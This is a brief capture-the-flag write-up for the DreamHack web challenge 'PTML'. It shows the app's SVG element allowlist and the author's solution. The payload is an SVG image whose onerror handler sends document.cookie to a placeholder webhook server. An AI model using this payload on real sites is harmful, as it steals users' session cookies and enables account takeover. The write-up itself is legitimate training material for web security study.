# PTML — DreamHack

> **Room / Challenge:** PTML (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** PTML (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1937`
- **Level:** `2`
- **Date:** `24-11-2025`

---

## Goal

Leveraging XSS Scripting to get the flag.

## My Solution

The app has a upload service which we can upload our `.svg` files then the bot will visit us with the flag cookie. There are allowed elements list in `main.py`:

```python
allowed_elements = [
    "svg", "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
    "text", "tspan", "textPath", "altGlyph", "altGlyphDef", "altGlyphItem",
    "glyphRef", "altGlyph", "animate", "animateColor", "animateMotion",
    "animateTransform", "mpath", "set", "desc", "title", "metadata",
    "defs", "g", "symbol", "use", "image", "switch", "style"
]
```

Constructed payload:

```html
<svg
  width="100%"
  height="100%"
  viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg"
>
  <image
    href="x"
    width="100"
    height="100"
    onerror="location.href='https://YOUR_SERVER/webhook?c='+document.cookie"
  />
</svg>
```

Submit this and check the server to get the flag.
